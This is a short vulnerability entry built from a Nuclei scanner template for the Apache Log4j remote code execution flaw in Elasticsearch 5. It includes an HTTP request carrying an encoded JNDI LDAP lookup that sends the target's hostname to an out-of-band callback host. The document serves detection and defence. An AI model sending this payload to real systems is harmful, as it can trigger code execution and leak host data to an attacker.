# Vulnerability: Elasticsearch 5 - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`elasticsearch5-log4j-rce.yaml`)

## Description
Elasticsearch 5 is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /_search?a=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.search.{{interactsh-url}}%7D HTTP/1.1
Host: {{Hostname}}

{
```

